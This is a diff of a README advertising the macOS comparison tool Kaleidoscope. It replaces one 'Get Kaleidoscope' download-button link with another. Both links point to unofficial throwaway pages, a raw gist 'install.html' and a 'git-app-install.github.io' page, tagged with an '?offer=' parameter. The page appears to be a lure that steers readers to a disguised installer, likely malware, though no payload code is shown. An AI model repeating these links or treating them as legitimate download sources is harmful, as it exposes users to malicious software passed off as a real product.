@@ -2,7 +2,7 @@
 
 Kaleidoscope is a powerful file comparison and merge tool for macOS users. It allows developers, designers, and writers to visually compare text files, images, and folders with precision and clarity.
 
-<a href="https://gistcdn.githack.com/mandemadhusleeping-cpu/f6ee9882f53562bdae8c7c311cb46a1a/raw/60a368d54b1657f4ba509a2001a075697fe1dc4b/install.html?offer=Kaleidoscope" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Kaleidoscope" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Kaleidoscope%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
